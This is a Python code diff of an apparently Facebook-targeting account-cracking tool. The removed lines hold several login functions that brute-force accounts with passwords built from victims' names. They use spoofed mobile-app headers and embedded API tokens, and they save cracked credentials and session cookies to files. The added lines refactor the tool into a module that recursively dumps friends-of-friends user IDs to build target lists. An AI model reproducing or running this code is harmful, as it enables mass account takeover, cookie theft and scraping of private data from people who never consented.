-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        ua  = "[FBAN/FB4A;FBAV/544.0.0.42.272;FBBV/862545688;FBDM/{density=1.9125,width=720,height=1520};FBLC/en_US;FBRV/869817591;FBCR/Life Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g play - 2024;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]"
-                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        response = requests.post(url, data=data, headers=headers)
-                        po = response.json()
-                        #oks.append(ids)
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [HUNTER-OK] '+ids+'|'+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/HUNTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
-                                        open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        cptr.append(f"{ids}|{pas}|{coki}")
-                                        jshdhd6 = cptr[-1]
-                                        ysbd(jshdhd6)
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[HUNTER-2F] '+ids+'|'+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [HUNTER-CP] '+ids+'|'+pas+'\033[1;97m')
-                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                                
+                friends = response.get('friends', {}).get('data', [])
+                new_main = []
+                new_unsep = []
+                
+                for friend in friends:
+                    try:
+                        friend_id = friend['id']
+                        friend_name = friend.get('name', 'Unknown')
+                        item = f"{friend_id}|{friend_name}"
+                        
+                        if sep_prefixes:
+                            if any(friend_id.startswith(p) for p in sep_prefixes):
+                                if item not in written_main:
+                                    written_main.add(item)
+                                    new_main.append(item)
+                            else:
+                                if item not in written_unsep:
+                                    written_unsep.add(item)
+                                    new_unsep.append(item)
                         else:
-                                        continue
-                loop+=1
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
-        except Exception as e:
-                pass
+                            if item not in written_main:
+                                written_main.add(item)
+                                new_main.append(item)
+                                
+                    except KeyError:
+                        continue
+                
+                if new_main:
+                    async with aiofiles.open(output_file, 'a', encoding='utf-8') as f:
+                        await f.write('\n'.join(new_main) + '\n')
+                    line_count += len(new_main)
+                
+                if new_unsep and unsep_file:
+                    async with aiofiles.open(unsep_file, 'a', encoding='utf-8') as f:
+                        await f.write('\n'.join(new_unsep) + '\n')
+                    line_count_un += len(new_unsep)
+                
+                if progress_callback:
+                    progress_callback(f"Extracted: {line_count} main, {line_count_un} unsep")
+        
+        return line_count, line_count_un
+    
+    async def dump_simple(
+        self,
+        uids: List[str],
+        output_file: Path,
+        progress_callback: Optional[Callable[[str], None]] = None
+    ) -> int:
+        """Simple dump - just get friends from input UIDs."""
+        result = await self.dump_friends(
+            uids=uids,
+            output_file=output_file,
+            recursive=False,
+            progress_callback=progress_callback
+        )
+        return result[0]
+    
+    async def dump_unlimited(
+        self,
+        uids: List[str],
+        output_file: Path,
+        unsep_file: Optional[Path] = None,
+        sep_prefixes: Optional[List[str]] = None,
+        progress_callback: Optional[Callable[[str], None]] = None
+    ) -> Tuple[int, int]:
+        """Unlimited dump - get friends of friends recursively."""
+        return await self.dump_friends(
+            uids=uids,
+            output_file=output_file,
+            unsep_file=unsep_file,
+            sep_prefixes=sep_prefixes,
+            recursive=True,
+            progress_callback=progress_callback
+        )
 
 
-def api2(ids,names,passlist):
+class FileUtils:
+    """File utility operations."""
+    
+    def __init__(self, config: Optional[Config] = None) -> None:
+        """Initialize with config."""
+        self._config = config or Config()
+    
+    @staticmethod
+    def shuffle_file_lines(filepath: Path) -> bool:
+        """Shuffle lines in a file randomly."""
         try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [HUNTER-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        ua  = "[FBAN/FB4A;FBAV/543.0.0.55.73;FBBV/846638223;FBDM/{density=2.8125,width=1080,height=2340};FBLC/nl_NL;FBRV/0;FBCR/vodafone NL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S936B;FBSV/16;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/541.0.0.85.79;FBBV/835516329;FBDM/{density=1.75,width=720,height=1515};FBLC/en_US;FBRV/838622447;FBCR/;FBMF/Wingtech;FBBD/T-Mobile;FBPN/com.facebook.katana;FBDV/TMRV065G;FBSV/14;FBOP/1;FBCA/arm64-v8a:;]"
-                        adid=str(uuid.uuid4())
-                        device_id=str(uuid.uuid4()) 
-                        data={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-                        headers={'User-Agent': uaa(),'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-                        url='https://api.facebook.com/method/auth.login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        response = requests.post(url, data=data, headers=headers)
-                        po = response.json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [HUNTER-OK] '+ids+'|'+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/HUNTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
-                                        open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        cptr.append(f"{ids}|{pas}|{coki}")
-                                        jshdhd6 = cptr[-1]
-                                        ysbd(jshdhd6)
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[HUNTER-2F] '+ids+'|'+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
-                                        sys.stdout.write('\r\r\033[1;31m [HUNTER-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                        elif 'www.facebook.com' in po['error_msg']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [HUNTER-CP] '+ids+'|'+pas+'\033[1;97m')
-                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                                
-                                        else:
-                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                                
-                        else:
-                                        continue
-                loop+=1
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
-        except Exception as e:
-                pass
-
-
-def api3(ids,names,passlist):
+            with open(filepath, 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+            
+            random.shuffle(lines)
+            
+            with open(filepath, 'w', encoding='utf-8') as f:
+                f.writelines(lines)
+            
+            return True
+        except Exception:
+            return False
+    
+    @staticmethod
+    def divide_file(filepath: Path, parts: int, output_dir: Path) -> List[Path]:
+        """Divide a file into multiple parts."""
+        output_files = []
+        
         try:
-                global ok,loop
-                sys.stdout.write('\r\r\033[1;37m [HUNTER-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        ua  = "[FBAN/FB4A;FBAV/525.0.0.53.51;FBBV/773514930;FBDM/{density=3.1875,width=1080,height=2340};FBLC/en_Qaau_US;FBRV/779001039;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S911U1;FBSV/15;FBOP/1;FBCA/arm64-v8a:;]"
-                        headers = {
-                            'Host': 'graph.facebook.com',
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'Accept-Encoding': 'gzip, deflate',
-                            'Connection': 'keep-alive',
-                            'Priority': 'u=3, i',
-                            'X-Fb-Sim-Hni': '45204',
-                            'X-Fb-Net-Hni': '45201',
-                            'X-Fb-Connection-Quality': 'GOOD',
-                            'Zero-Rated': '0',
-                            'User-Agent': uaa(),
-                            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                            'X-Fb-Connection-Bandwidth': '24807555',
-                            'X-Fb-Connection-Type': 'MOBILE.LTE',
-                            'X-Fb-Device-Group': '5120',
-                            'X-Tigon-Is-Retry': 'False',
-                            'X-Fb-Friendly-Name': 'authenticate',
-                            'X-Fb-Request-Analytics-Tags': 'unknown',
-                            'X-Fb-Http-Engine': 'Liger',
-                            'X-Fb-Client-Ip': 'True',
-                            'X-Fb-Server-Cluster': 'True',
-                            'Content-Length': '847'
-                        }
-                        data = {
-                            'adid': 'aE308fedcA7550af',
-                            'format': 'json',
-                            'device_id': str(uuid.uuid4()),
-                            'family_device_id': str(uuid.uuid4()),
-                            'secure_family_device_id': str(uuid.uuid4()),
-                            'cpl': 'true',
-                            'try_num': '1',
-                            'email': ids,
-                            'password': pas,
-                            'method': 'auth.login',
-                            'generate_session_cookies': '1',
-                            'sim_serials': "['80973453345210784798']",
-                            'openid_flow': 'android_login',
-                            'openid_provider': 'google',
-                            'openid_emails': "['01710940017']",
-                            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-                            'error_detail_type': 'button_with_disabled',
-                            'source': 'account_recovery',
-                            'locale': 'en_GB',
-                            'client_country_code': 'GB',
-                            'fb_api_req_friendly_name': 'authenticate',
-                            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
-                        }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        response = requests.post(url, data=data, headers=headers)
-                        po = response.json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [HUNTER-OK] '+ids+'|'+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/HUNTER-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
-                                        open('/sdcard/HUNTER-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        cptr.append(f"{ids}|{pas}|{coki}")
-                                        jshdhd6 = cptr[-1]
-                                        ysbd(jshdhd6)
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[HUNTER-2F] '+ids+'|'+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [HUNTER-CP] '+ids+'|'+pas+'\033[1;97m')
-                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                        else:
-                                                open('/sdcard/HUNTER-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                cps.append(ids)
-                                                break
-                                                
-                        else:
-                                        continue
-                loop+=1
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
-        except Exception as e:
-                pass
+            with open(filepath, 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+            
+            base_name = filepath.stem.lower()
+            part_size = len(lines) // parts
+            remainder = len(lines) % parts
+            
+            for i in range(parts):
+                start = i * part_size
+                end = start + part_size
+                if i == parts - 1:
+                    end += remainder
+                
+                part_file = output_dir / f"{base_name}_part_{i+1}.txt"
+                with open(part_file, 'w', encoding='utf-8') as f:
+                    f.writelines(lines[start:end])
+                
+                output_files.append(part_file)
+            
+            return output_files
+        except Exception:
+            return []
+    
+    @staticmethod
+    def cut_or_delete_lines(
+        filepath: Path,
+        start_line: int,
+        end_line: int,
+        cut_to: Optional[Path] = None
+    ) -> bool:
+        """Cut or delete lines from a file."""
+        try:
+            with open(filepath, 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+            
+            start_idx = start_line - 1
+            end_idx = end_line
+            
+            if cut_to:
+                with open(cut_to, 'w', encoding='utf-8') as f:
+                    f.writelines(lines[start_idx:end_idx])
+            
+            del lines[start_idx:end_idx]
+            
+            with open(filepath, 'w', encoding='utf-8') as f:
+                f.writelines(lines)
+            
+            return True
+        except Exception:
+            return False
+    
+    @staticmethod
+    def separate_by_prefix(filepath: Path, prefixes: List[str], output_file: Path) -> int:
+        """Separate lines that start with given prefixes."""
+        try:
+            with open(filepath, 'r', encoding='utf-8') as f:
+                lines = f.read().splitlines()
+            
+            matching = [line for line in lines if line.startswith(tuple(prefixes))]
+            
+            if matching:
+                with open(output_file, 'w', encoding='utf-8') as f:
+                    f.write('\n'.join(matching))
+                return len(matching)
+            
+            return 0
+        except Exception:
+            return 0
+    
+    @staticmethod
+    def remove_emoji_names(filepath: Path) -> int:
+        """Remove lines with emoji or stylish names."""
+        import unicodedata
+        
+        emoji_pattern = re.compile(
+            "["
+            "\U0001F600-\U0001F64F"
+            "\U0001F300-\U0001F5FF"
+            "\U0001F680-\U0001F6FF"
+            "\U0001F1E0-\U0001F1FF"
+            "\U00002700-\U000027BF"
+            "\U0001F900-\U0001F9FF"
+            "\U00002600-\U000026FF"
+            "\U00002B00-\U00002BFF"
+            "\U0001FA70-\U0001FAFF"
+            "\U000025A0-\U000025FF"
+            "]+", flags=re.UNICODE
+        )
+        
+        def has_invalid_chars(text: str) -> bool:
+            for ch in text:
+                cat = unicodedata.category(ch)
+                if not (cat.startswith(('L', 'M')) or cat == 'Zs'):
+                    return True
+            return False
+        
+        def is_repeated_char(text: str) -> bool:
+            chars = [c for c in text if not c.isspace()]
+            return bool(chars) and len(set(chars)) == 1
+        
+        try:
+            with open(filepath, 'r', encoding='utf-8') as f:
+                lines = f.read().splitlines()
+            
+            unique_lines = sorted(set(lines), reverse=True)
+            clean_lines = []
+            
+            for line in unique_lines:
+                line = line.strip()
+                if not line or 'name' in line.lower() or not re.match(r'^[1-9]', line):
+                    continue
+                
+                parts = line.split('|', 1)
+                if len(parts) != 2:
+                    continue
+                
+                uid, name = parts
+                name = name.strip()
+                
+                if not name:
+                    continue
+                if emoji_pattern.search(name):
+                    continue
+                if has_invalid_chars(name):
+                    continue
+                if is_repeated_char(name):
+                    continue
+                
+                clean_lines.append(f"{uid}|{name}")
+            
+            with open(filepath, 'w', encoding='utf-8') as f:
+                f.write('\n'.join(clean_lines))
+            
+            return len(clean_lines)
+        except Exception:
+            return 0
 
 
+# ================== BACKWARD COMPATIBILITY ==================
 
-try:
-    menu()
-except requests.exceptions.ConnectionError:
-    print('\n No internet connection ...')
-    exit()
-except:exit()
+# Create default instances
+_config = Config()
+_api = FacebookAPI(_config)
+_file_utils = FileUtils(_config)
+
+# Function aliases for backward compatibility
+def login_with_credentials(uid: str, password: str) -> Tuple[Optional[str], Optional[str], str]:
+    success, status = _api.login_with_credentials(uid, password)
+    if success:
+        return _api.cookie, _api.token, status
+    return None, None, status
+
+def login_with_cookie(cookie: str) -> Tuple[Optional[str], str]:
+    success, status = _api.login_with_cookie(cookie)
+    if success:
+        return _api.token, status
+    return None, status
+
+def validate_login(token: str, cookie: str) -> Tuple[bool, List[str]]:
+    _api._token = token
+    _api._cookie = cookie
+    return _api.validate_login()
+
+def extract_uid_from_url(url: str) -> Optional[str]:
+    return _api.extract_uid_from_url(url)
+
+async def dump_unlimited(
+    uids: List[str],
+    token: str,
+    cookie: str,
+    output_file: Path,
+    unsep_file: Optional[Path] = None,
+    sep_prefixes: Optional[List[str]] = None,
+    progress_callback: Optional[Callable[[str], None]] = None
+) -> Tuple[int, int]:
+    _api._token = token
+    _api._cookie = cookie
+    return await _api.dump_unlimited(uids, output_file, unsep_file, sep_prefixes, progress_callback)
+
+async def dump_simple(
+    uids: List[str],
+    token: str,
+    cookie: str,
+    output_file: Path,
+    progress_callback: Optional[Callable[[str], None]] = None
+) -> int:
+    _api._token = token
+    _api._cookie = cookie
+    return await _api.dump_simple(uids, output_file, progress_callback)
+
+shuffle_file_lines = FileUtils.shuffle_file_lines
+divide_file = FileUtils.divide_file
+cut_or_delete_lines = FileUtils.cut_or_delete_lines
+separate_by_prefix = FileUtils.separate_by_prefix
+remove_emoji_names = FileUtils.remove_emoji_names
+
+
+if __name__ == "__main__":
+    cfg = Config()
+    api = FacebookAPI(cfg)
+    print(f"Core module loaded successfully!")
+    print(f"Platform: {cfg.platform.name}")
+    print(f"Logged in: {api.is_logged_in}")
